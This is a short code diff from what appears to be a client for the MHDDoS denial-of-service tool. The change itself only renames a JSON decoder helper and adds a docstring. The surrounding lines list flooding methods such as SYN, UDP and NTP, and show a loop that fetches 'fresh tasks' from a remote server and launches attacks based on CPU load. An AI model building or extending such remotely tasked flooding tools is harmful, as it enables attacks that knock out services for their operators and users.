@@ -35,8 +35,13 @@ l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
       "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]
 
 
-def customDecoder(Obj):
-    return namedtuple('X', Obj.keys())(*Obj.values())
+def dict_to_nt(obj: dict):
+    """
+    Re-map dict-like object to the namedtuple instance, having eventual
+    attributes and values exactly as 'obj' keys and their values.
+    :return: instance of generated namedtuple
+    """
+    return namedtuple('X', obj.keys())(*obj.values())
 
 
 def as_mhddos_args(config, threads_limit=0):
@@ -152,7 +157,7 @@ if __name__ == '__main__':
             logger.info("Getting fresh tasks from the server!")
             try:
                 ftrs = []
-                for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
+                for conf in json.loads(urlopen(url).read(), object_hook=dict_to_nt):
                     mhddos_args = as_mhddos_args(conf, threads_limit=max_threads)
                     if mhddos_args:
                         cpu_usage = psutil.cpu_percent(4)
